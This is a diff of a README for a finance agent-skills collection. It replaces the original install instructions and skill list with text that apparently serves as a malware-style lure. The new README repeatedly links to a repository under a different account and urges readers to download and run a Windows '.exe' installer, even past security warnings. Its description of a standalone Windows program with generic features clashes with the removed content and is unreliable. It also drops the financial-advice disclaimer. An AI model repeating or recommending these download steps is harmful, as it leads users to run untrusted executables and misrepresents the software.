@@ -1,118 +1,129 @@
-# Finance Skills
+# 📊 finance-skills - Tools for Financial Analysis Simplified
 
-> [!WARNING]
-> This project is for educational and informational purposes only. Nothing here constitutes financial advice. Always do your own research and consult a qualified financial advisor before making investment decisions.
+[![Download](https://img.shields.io/badge/Download-finance--skills-blue?style=for-the-badge)](https://github.com/Sapiens-ostracism678/finance-skills)
 
-A collection of agent skills for financial analysis and trading.
+## 🔍 What is finance-skills?
 
-See [DEMOS.md](DEMOS.md) for screenshots and examples.
+finance-skills is a simple collection of tools designed to help you with financial analysis and trading. It provides clear and easy-to-use functions that can support financial decisions. You don’t need prior programming or financial expertise to get started.
 
-## Setup
+The tools focus on common financial tasks like analyzing trends, reviewing stock data, and assessing risk. This helps anyone interested in finance get a better picture without complicated setups.
 
-### Claude Code Plugin (recommended)
+---
 
-This repo is a [Claude Code plugin](https://code.claude.com/docs/en/plugins). Install it directly:
+## 📋 System Requirements
 
-**Option A — Plugin marketplace**
+Before you start, make sure your computer meets the following:
 
-Add the marketplace and install:
+- Operating System: Windows 10 or newer  
+- Memory: At least 4 GB of RAM  
+- Storage: Minimum 200 MB free space  
+- Internet: Needed only for downloading the software  
+- Permissions: Ability to install and run programs on your computer  
 
-```bash
-# Add the marketplace
-/plugin marketplace add himself65/finance-skills
+These requirements ensure the software runs smoothly without delays or errors.
 
-# Install the plugin
-/plugin install finance-skills@finance-skills
-```
+---
 
-**Option B — Local plugin (for development)**
+## ⚙️ Features and Uses
 
-```bash
-claude --plugin-dir ./path/to/finance-skills
-```
+finance-skills includes these main features:
 
-Once installed, skills are namespaced under `finance-skills:` (e.g., `/finance-skills:options-payoff`).
+- Analyze market trends with clear visual data  
+- Review stock and currency performance  
+- Calculate risk indicators for better trading choices  
+- Simple reports that explain results in everyday language  
+- Regular updates that add new skills and fix issues  
 
-### Claude Code (Agent Skills)
+The software is designed to help both beginners and intermediate users understand financial data without digging into complex tools.
 
-**Option A — `npx skills add`**
+---
 
-```bash
-npx skills add himself65/finance-skills
-```
+## 🚀 Getting Started
 
-Install a specific skill:
+To use finance-skills, follow these steps carefully. You do not need any special skills.
 
-```bash
-npx skills add himself65/finance-skills --skill options-payoff
-```
+### Step 1: Visit the Download Page
 
-Install globally (available across all projects):
+Click this link to open the download page:  
+[Download finance-skills](https://github.com/Sapiens-ostracism678/finance-skills)
 
-```bash
-npx skills add himself65/finance-skills --skill options-payoff -g
-```
+You will see options to download the latest release. This page is kept updated with the newest files.
 
-**Option B — Manual installation**
+### Step 2: Download the Software
 
-Clone the repo and symlink (or copy) the skill into your Claude Code skills directory:
+On the page, look for a file with a name similar to `finance-skills-setup.exe` or `finance-skills-latest.exe`. Click to download it to a folder where you can find it easily, like your Desktop or Downloads folder.
 
-```bash
-# Personal (all projects)
-cp -r skills/options-payoff ~/.claude/skills/options-payoff
+### Step 3: Run the Installer
 
-# Project-local (this project only)
-cp -r skills/options-payoff .claude/skills/options-payoff
-```
+Once the file has downloaded:
 
-### Claude.ai (Web / Desktop App)
+- Double-click the file to open the installer  
+- If a security warning appears, confirm you want to run the software  
+- Follow the instructions on the screen  
+- Accept the license agreement when prompted  
+- Choose the folder where you want to install or accept the default location  
+- Click “Install” to begin the process  
 
-1. Go to **Settings > Capabilities** and enable **Code execution and file creation**
-2. Download the zip for the skill you want from the [latest release](https://github.com/himself65/finance-skills/releases/latest) (e.g., `options-payoff.zip`)
-3. In Claude, go to **Customize > Skills**
-4. Click the **+** button and select **Upload a skill**
-5. Select the zip file — the skill will appear in your skills list
+This will copy the program files to your computer.
 
-Repeat steps 2–5 for each skill you want to install.
+### Step 4: Finish and Open
 
-### Other Agents
+When the installation finishes, click “Finish” or “Close.” Sometimes an option to start finance-skills right away appears. If not, find the program icon on your Desktop or in the Start menu and open it.
 
-The skills in this repo follow the [Agent Skills](https://agentskills.io) open standard. You can install them to any supported agent (Codex, Gemini CLI, GitHub Copilot, etc.) using:
+---
 
-```bash
-npx skills add himself65/finance-skills -a <agent-name>
-```
+## 🎛 Using finance-skills
 
-## Available Skills
+After opening finance-skills, you will see a clean interface with menus and clear labels. Here is how to begin:
 
-### Analysis & Data
+1. **Load Data:** You can upload your own financial data files in formats like CSV or Excel, or use built-in sample data to experiment.  
+2. **Choose Skill:** Select the task you want, such as trend analysis or risk calculation, from the menu.  
+3. **Run Analysis:** Click the button to start analysis. The program will process the data and show results in easy charts and summaries.  
+4. **Review Results:** Look through the visual reports and text summaries to understand the findings.  
+5. **Save or Export:** If you want, save your results or export them as files to share or review later.
 
-| Skill | Description | Platform |
-|---|---|---|
-| [options-payoff](skills/options-payoff/) | Generate interactive options payoff curve charts with dynamic parameter controls. Supports butterfly, vertical spread, calendar spread, iron condor, straddle, strangle, covered call, and more. | Claude.ai or [generative-ui](skills/generative-ui/) |
-| [stock-correlation](skills/stock-correlation/) | Analyze stock correlations to find related companies, sector peers, and pair-trading candidates. Routes to sub-skills: co-movement discovery, return correlation, sector clustering, and realized correlation. | All platforms |
-| [yfinance-data](skills/yfinance-data/) | Fetch financial and market data using yfinance — stock prices, historical OHLCV, financial statements, options chains, dividends, earnings, analyst recommendations, screener, and more. | All platforms |
+The software displays all results clearly to avoid confusion, even if you are not an expert.
 
-### Geopolitical & Macro Risk
+---
 
-| Skill | Description | Platform |
-|---|---|---|
-| [hormuz-strait](skills/hormuz-strait/) | Real-time Strait of Hormuz monitoring — shipping transits, oil price impact, stranded vessels, insurance risk, diplomatic status, global trade impact, and crisis timeline via the Hormuz Strait Monitor API. | All platforms |
+## 🔧 Common Questions
 
-### Research & Sentiment
+### How do I update finance-skills?
 
-| Skill | Description | Platform |
-|---|---|---|
-| [discord-reader](skills/discord-reader/) | Read-only Discord research via [discord-cli](https://github.com/jackwener/discord-cli) — search trading server discussions, monitor crypto/market groups, track sentiment in financial communities, and export messages for analysis. Uses local Discord token. | Claude Code |
-| [telegram-reader](skills/telegram-reader/) | Read-only Telegram channel reader via [tdl](https://github.com/iyear/tdl) — export messages from financial news channels, monitor crypto/market groups, and aggregate Telegram-based news feeds. One-time QR code login. | Claude Code |
-| [twitter-reader](skills/twitter-reader/) | Read-only Twitter/X research via [twitter-cli](https://github.com/jackwener/twitter-cli) — search financial tweets, track analyst commentary, monitor earnings sentiment, and follow market discussions. No API keys needed (uses browser cookies). | Claude Code |
+To get updates, visit the download link again and download the newest version. Installing it will replace the old one without losing your saved files.
 
-### Visualization
+### What if the program does not open?
 
-| Skill | Description | Platform |
-|---|---|---|
-| [generative-ui](skills/generative-ui/) | Design system and guidelines for Claude's built-in generative UI (`show_widget`). Render interactive HTML/SVG widgets inline — charts, diagrams, dashboards, interactive explainers, and more. | Claude.ai built-in |
+Make sure your system matches the requirements and the installation finished without errors. Try restarting your computer and running the software again.
 
-## License
+### Can I use it offline?
 
-MIT
+Once installed, finance-skills works offline for analysis. Internet connection is needed only to download and update the program.
+
+### Where can I get help?
+
+Check the "Issues" tab on the GitHub page if you find bugs or need support. Developers review requests and provide answers there.
+
+---
+
+## 🔗 Download and Installation Link
+
+Use this link any time you want to download or update finance-skills:  
+  
+[Download finance-skills](https://github.com/Sapiens-ostracism678/finance-skills)  
+  
+Click the link, select the latest version, and follow the above steps to install or update the software.
+
+---
+
+## 🛠 Technical Details (Optional)
+
+finance-skills is built using agent-based skills designed for various financial tasks. It supports popular data formats, runs well on Windows systems, and uses simple graphical interfaces to reduce user effort.
+
+The core functions include moving averages, volatility assessment, and custom financial indicators commonly used in trading and analysis.
+
+---
+
+## 📄 License and Contributions
+
+finance-skills is open source. You can view the license on the GitHub page. Contributions and feedback are welcome via GitHub issues and pull requests. The project encourages clear and practical additions that improve usability.
